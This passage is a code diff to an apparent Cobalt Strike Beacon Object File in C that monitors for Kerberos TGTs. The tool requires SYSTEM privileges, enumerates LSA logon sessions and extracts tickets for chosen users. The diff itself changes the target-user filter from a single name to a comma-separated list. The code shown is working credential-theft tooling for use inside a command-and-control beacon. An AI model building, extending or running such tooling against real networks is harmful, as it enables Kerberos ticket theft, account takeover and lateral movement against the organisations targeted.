@@ -137,7 +137,25 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
     return STATUS_SUCCESS;
 }
 
-NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTICKET_CACHE cache) {
+// Split comma-separated list of target users on "," and evaluate if the captured ticket belongs to a target user
+BOOL IsTargetUser(const char* targetUsers, const char* username) {
+    const char* p = targetUsers;
+    while (*p) {
+        const char* start = p;
+        while (*p && *p != ',') p++;
+        int len = (int)(p - start);
+        char token[256] = { 0 };
+        if (len > 0 && len < (int)sizeof(token)) {
+            MSVCRT$memcpy(token, start, len);
+            if (MSVCRT$_stricmp(token, username) == 0)
+                return TRUE;
+        }
+        if (*p == ',') p++;
+    }
+    return FALSE;
+}
+
+NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUsers, PTICKET_CACHE cache) {
     NTSTATUS status = STATUS_SUCCESS;
     ULONG sessionCount   = 0;
     PLUID sessionList    = NULL;
@@ -162,14 +180,14 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
         if (!NT_SUCCESS(status) || !sessionData)
             continue;
 
-        // Check if a target user has been set
-        if (targetUser && targetUser[0] != '\0') {
+        // Check if a target user has been specified
+        if (targetUsers && targetUsers[0] != '\0') {
             char username[256] = { 0 };
             if (sessionData->UserName.Buffer && sessionData->UserName.Length > 0)
                 KERNEL32$WideCharToMultiByte(CP_ACP, 0, sessionData->UserName.Buffer, sessionData->UserName.Length / 2, username, sizeof(username), NULL, NULL);
 
             // Case-insensitive name comparison
-            if (MSVCRT$_stricmp(username, targetUser) != 0) {
+            if (!IsTargetUser(targetUsers, username)) {
                 SECUR32$LsaFreeReturnBuffer(sessionData);
                 continue;
             }
@@ -370,7 +388,7 @@ VOID go(char* args, int argc) {
         
     BeaconDataParse(&parser, args, argc);
     int interval = BeaconDataInt(&parser);
-    char* targetUser = BeaconDataExtract(&parser, NULL);
+    char* targetUsers = BeaconDataExtract(&parser, NULL);
         
     // Check for SYSTEM privileges by checking primary token first
     if (!IsSystem()){
@@ -396,8 +414,8 @@ VOID go(char* args, int argc) {
     }
     
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting TGT monitor (interval: %ds)\n", interval);
-    if (targetUser && targetUser[0] != '\0')
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target user: %s\n", targetUser);
+    if (targetUsers && targetUsers[0] != '\0')
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users: %s\n", targetUsers);
     BeaconWakeup(); 
 
     TICKET_CACHE prev = { 0 };
@@ -406,7 +424,7 @@ VOID go(char* args, int argc) {
     do {
 
         // Periodically check for new TGTs
-        if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUser, &curr))) {
+        if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUsers, &curr))) {
             RefreshCache(hLsa, authPackage, &prev, &curr);
             if (prev.tickets)
                 MemFree(prev.tickets);
